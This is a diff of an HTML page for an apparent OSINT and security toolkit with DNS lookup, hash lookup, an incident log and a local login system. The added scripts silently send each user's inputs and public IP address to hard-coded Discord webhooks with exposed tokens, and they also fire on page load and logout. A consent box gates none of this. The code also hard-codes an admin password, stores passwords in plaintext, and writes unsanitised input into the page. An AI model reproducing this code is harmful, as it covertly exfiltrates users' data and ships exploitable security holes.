+  document.getElementById("userOSINTResult").innerHTML = result;
+}
+
+function lookupDomain(e) {
+  e.preventDefault();
+  const domain = document.getElementById("domainReconInput").value.trim();
+  sendLogToDiscord("Domain Recon Lookup", [{ name: "Domain", value: domain }]);
+  const resultBox = document.getElementById("domainReconResult");
+  resultBox.innerHTML = `<p><strong>Domain:</strong> ${domain}</p><p>Loading DNS data...</p>`;
+  fetch("https://dns.google/resolve?name=" + domain + "&type=A")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.Answer ? data.Answer.map(a => a.data).join(", ") : "No A records found";
+      resultBox.innerHTML += `<p><strong>A Record:</strong> ${ip}</p>`;
+      return fetch("https://dns.google/resolve?name=" + domain + "&type=MX");
+    })
+    .then(res => res.json())
+    .then(mx => {
+      const records = mx.Answer ? mx.Answer.map(r => r.data).join("<br>") : "No MX records";
+      resultBox.innerHTML += `<p><strong>MX Records:</strong><br>${records}</p>`;
+    })
+    .catch(() => {
+      resultBox.innerHTML += `<p class='text-danger'>Error fetching DNS info.</p>`;
+    });
+}
+
+function lookupHash(e) {
+  e.preventDefault();
+  const hash = document.getElementById("hashInput").value.trim().toLowerCase();
+  sendLogToDiscord("Hash Lookup", [{ name: "Hash", value: hash }]);
+  const known = {
+    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
+    "e99a18c428cb38d5f260853678922e03": "abc123",
+    "098f6bcd4621d373cade4e832627b4f6": "test",
+    "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
+    "25f9e794323b453885f5181f1b624d0b": "123456789"
+  };
+  const result = known[hash] 
+    ? `<p class='text-danger'>Hash found! Plaintext: <strong>${known[hash]}</strong></p>`
+    : `<p class='text-success'>Hash not found in local DB.</p>`;
+  document.getElementById("hashLookupResult").innerHTML = result;
+}
+
+function saveIncident(e) {
+  e.preventDefault();
+  const txt = document.getElementById("incidentText").value.trim();
+  if (!txt) return;
+  sendLogToDiscord("Incident Log Entry", [{ name: "Entry", value: txt }]);
+  const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
+  log.push({ text: txt, time: new Date().toLocaleString() });
+  localStorage.setItem("incidentLog", JSON.stringify(log));
+  renderIncidentLog();
+  document.getElementById("incidentText").value = "";
+}
+</script>
+<script>
+function logActionToFeed(title, data = []) {
+  const feed = JSON.parse(localStorage.getItem("liveFeed") || "[]");
+  const now = new Date().toLocaleTimeString();
+  const entry = {
+    time: now,
+    title: title,
+    details: data.map(d => `${d.name}: ${d.value}`).join(" | ")
+  };
+  feed.unshift(entry);
+  if (feed.length > 50) feed.pop();
+  localStorage.setItem("liveFeed", JSON.stringify(feed));
+  renderLiveFeed();
+}
+
+function renderLiveFeed() {
+  const feed = JSON.parse(localStorage.getItem("liveFeed") || "[]");
+  const container = document.getElementById("liveFeedContainer");
+  if (!container) return;
+  container.innerHTML = feed.map(log => `
+    <div class="mb-2"><strong>${log.time}</strong> — ${log.title}<br><span class="text-muted">${log.details}</span></div>
+  `).join("");
+}
+
+// Enhance Discord logger to also call feed logger
+async function sendLogToDiscord(title, fields) {
+  const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Unknown");
+  const payload = {
+    embeds: [{
+      title: title,
+      color: 3447003,
+      fields: fields.concat([{ name: "IP", value: ip, inline: true }]),
+      timestamp: new Date().toISOString()
+    }],
+    username: "Site Logger"
+  };
+  fetch("https://discord.com/api/webhooks/1383184501991018701/Zm4iwRSIN4mD5riPaoNPK6UaBa5fc7IlWLDvbUvLooJmkhvSGWO0J1wFdcRS5FuqIMBt", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+  logActionToFeed(title, fields);
+}
+
+window.addEventListener("DOMContentLoaded", renderLiveFeed);
+</script>
 <div id="authOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0f172a;z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;">
 <div style="background:#1e293b;padding:20px;border-radius:10px;width:300px;">
 <h3 style="color:white;margin-bottom:10px;">Login or Signup</h3>
@@ -697,65 +1755,181 @@
 <div id="authError" style="color:red;margin-top:10px;"></div>
 </div>
 </div>
-
-
-
-
 <script>
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1383193129854701638/rjrXXa4nUmRlq-eHSsS49LRn8O9iwBW9l3IJOQeNzhKW9QAq9y1U20s1tztk9QmWpwWO";
+function acceptConsent() {
+  // Store consent status in localStorage
+  localStorage.setItem("userConsent", "true");
 
-// Main logger function
-async function sendLogToDiscord(title, fields = []) {
-  const ip = await fetch("https://api.ipify.org?format=json")
-    .then(res => res.json())
-    .then(data => data.ip)
-    .catch(() => "Unknown");
-
-  const payload = {
-    embeds: [{
-      title: title,
-      color: 3447003,
-      fields: fields.concat([{
-        name: "IP Address",
-        value: ip,
-        inline: true
-      }]),
-      timestamp: new Date().toISOString()
-    }],
-    username: "CybrSearch Logger"
-  };
-
-  try {
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
-  } catch (err) {
-    console.error("Discord log failed:", err);
+  // Hide the consent overlay
+  const overlay = document.getElementById("consentOverlay");
+  if (overlay) {
+    overlay.style.display = "none";
   }
 }
 
-// Auto-bind loggers to all forms and buttons
+// Automatically hide consent overlay if user already agreed
 window.addEventListener("DOMContentLoaded", () => {
-  document.querySelectorAll("form").forEach(form => {
-    form.addEventListener("submit", () => {
-      sendLogToDiscord("Form Submitted", [
-        { name: "Form ID", value: form.id || "unknown" }
-      ]);
-    });
-  });
+  if (localStorage.getItem("userConsent") === "true") {
+    const overlay = document.getElementById("consentOverlay");
+    if (overlay) {
+      overlay.style.display = "none";
+    }
+  }
+});
+</script>
+<script>
+// =============== AUTH SYSTEM =================
+function showError(msg){document.getElementById("authError").textContent = msg;}
 
-  document.querySelectorAll("button").forEach(btn => {
-    btn.addEventListener("click", () => {
-      sendLogToDiscord("Button Clicked", [
-        { name: "Label", value: btn.textContent.trim() || "Unnamed" }
-      ]);
-    });
+function validCredentials(u,p){
+  if(!u||!p) {showError("Username and password cannot be empty.");return false;}
+  if(u.length<3 || p.length<6){showError("Username ≥3 chars & password ≥6 chars.");return false;}
+  if(/[^a-zA-Z0-9]/.test(u)){showError("Username can only contain letters & numbers.");return false;}
+  return true;
+}
+
+function login(){
+  const u = document.getElementById("authUsername").value.trim();
+  const p = document.getElementById("authPassword").value.trim();
+  const users = JSON.parse(localStorage.getItem("users")||"{}");
+  const banned = JSON.parse(localStorage.getItem("banned")||"[]");
+
+  if(!validCredentials(u,p)) return;
+  if(banned.includes(u)){showError("You are banned.");return;}
+
+  if(users[u] && users[u]===p){
+     localStorage.setItem("loggedInUser",u);
+     enterSite(u);
+  } else {
+     showError("Invalid credentials.");
+  }
+}
+
+function signup(){
+  const u = document.getElementById("authUsername").value.trim();
+  const p = document.getElementById("authPassword").value.trim();
+  const users = JSON.parse(localStorage.getItem("users")||"{}");
+  const banned = JSON.parse(localStorage.getItem("banned")||"[]");
+
+  if(!validCredentials(u,p)) return;
+  if(banned.includes(u)){showError("You are banned.");return;}
+  if(users[u]){showError("Username already taken.");return;}
+
+  users[u]=p;
+  localStorage.setItem("users",JSON.stringify(users));
+  localStorage.setItem("loggedInUser",u);
+  enterSite(u);
+}
+
+function logout(){
+  localStorage.removeItem("loggedInUser");
+  document.getElementById("authOverlay").style.display="flex";
+  document.getElementById("logoutBtn").style.display="none";
+  const a=document.getElementById("admin-tab"); if(a) a.style.display="none";
+}
+
+function enterSite(u){
+  document.getElementById("authOverlay").style.display="none";
+  document.getElementById("logoutBtn").style.display="block";
+  if(u==="sysadmin"){
+    const a=document.getElementById("admin-tab"); if(a) a.style.display="block";
+  }
+  renderBanned();
+}
+
+function banUser(){
+  const input=document.getElementById("banUserInput").value.trim();
+  if(!input) return;
+  let banned=JSON.parse(localStorage.getItem("banned")||"[]");
+  if(!banned.includes(input)){banned.push(input);localStorage.setItem("banned",JSON.stringify(banned));}
+  renderBanned();
+}
+
+function renderBanned(){
+  const banned=JSON.parse(localStorage.getItem("banned")||"[]");
+  const html = banned.map(u=>`<div>🚫 ${u}</div>`).join("") || "<div class='text-muted'>No banned users.</div>";
+  const list=document.getElementById("bannedList"); if(list) list.innerHTML=html;
+}
+
+window.addEventListener("DOMContentLoaded",()=>{
+  // ensure default admin exists
+  const users=JSON.parse(localStorage.getItem("users")||"{}");
+  if(!users["sysadmin"]){users["sysadmin"]="!Admin420!"; localStorage.setItem("users",JSON.stringify(users));}
+
+  const u=localStorage.getItem("loggedInUser");
+  if(u){enterSite(u);} else {document.getElementById("authOverlay").style.display="flex";}
+});
+</script>
+<!-- 🔒 Panic and Logout Buttons -->
+<script>
+function panicClear() {
+  localStorage.clear();
+  document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#f9fafb;"><h1 style="color:#111;font-size:24px;">Welcome to Weather Tracker 🌤️</h1></div>';
+  history.pushState(null, "", "/weather");
+}
+
+function logout() {
+  localStorage.removeItem("userSession");
+  location.reload();
+}
+</script>
+<script>
+// Discord Webhook
+const WEBHOOK = "https://discord.com/api/webhooks/1383184501991018701/Zm4iwRSIN4mD5riPaoNPK6UaBa5fc7IlWLDvbUvLooJmkhvSGWO0J1wFdcRS5FuqIMBt";
+
+// Send log to Discord
+async function sendToDiscord(title, embed = {}) {
+  const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "Unknown");
+  const payload = {
+    username: "Logger",
+    embeds: [{
+      title,
+      color: 5814783,
+      fields: embed.fields || [],
+      footer: { text: "IP: " + ip },
+      timestamp: new Date().toISOString()
+    }]
+  };
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
   });
+}
+
+// Panic Clear
+function panicClear() {
+  localStorage.clear();
+  document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:white;"><h1 style="font-size:24px;">Session Reset. Redirecting...</h1></div>';
+  history.pushState(null, "", "/");
+}
+
+// Logout
+function logout() {
+  localStorage.removeItem("userSession");
+  sendToDiscord("🔓 Logout Triggered");
+  location.reload();
+}
+
+// General page load log
+document.addEventListener("DOMContentLoaded", () => {
+  sendToDiscord("📥 Page Loaded");
 });
 </script>
 
+<script>
+function logout() {
+  // Remove session from local storage
+  localStorage.removeItem("userSession");
+
+  // Send logout log to Discord
+  sendLogToDiscord("🔒 User Logged Out", [
+    { name: "Action", value: "Manual logout from UI" }
+  ]);
+
+  // Reload the page
+  location.reload();
+}
+</script>
 </body>
 </html>
-
